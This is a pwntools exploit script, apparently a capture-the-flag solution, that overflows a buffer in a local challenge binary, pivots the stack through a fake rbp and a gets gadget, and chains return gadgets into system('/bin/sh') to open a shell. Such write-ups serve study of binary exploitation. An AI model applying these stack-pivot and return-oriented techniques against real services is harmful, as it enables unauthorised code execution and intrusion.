from pwn import *

# r = process('./chall')
r = remote('127.0.0.1', 9999)
r.recvuntil(b'Enter something:\n')

input("Attach a debugger? ")

data = 0x404000
data_len = 0x1000
fake_rbp_data_offset = 0x100
fake_rbp = p64(data + fake_rbp_data_offset)
gets_gadget = p64(0x401171)
system_gadget = p64(0x401169)
ret_gadget = p64(0x401016)

payload = b'A' * 16
payload += fake_rbp
payload += gets_gadget

r.sendline(payload)
# gets(fake_rbp - 0x10) is now called.
# We'll write "/bin/sh" there. 
# The gets call is followed by a leave instructions, so our fake_rbp now becomes our stack pointer for the next return
# Conveniently, gets will return the buffer into rax, so we can chain that directly with our systems gadget.
# I later found out there is actually a way easier solution (see https://hackmd.io/@saspect/SkgaNlLka) by calling system_gadget, since rax points to the gets buffer.
payload2 = b'/bin/sh\0'
while len(payload2) != 0x10:
    payload2 += b'\0'
payload2 += b'B' * 8  # Will become next rbp but we don't care anymore
# We have to move rsp quite away now to not reoverwrite the /bin/sh string in system's (or subcalls) frames.
for _ in range((data_len - fake_rbp_data_offset - 0x100)//8):
    payload2 += ret_gadget
payload2 += system_gadget
r.sendline(payload2)

r.interactive()
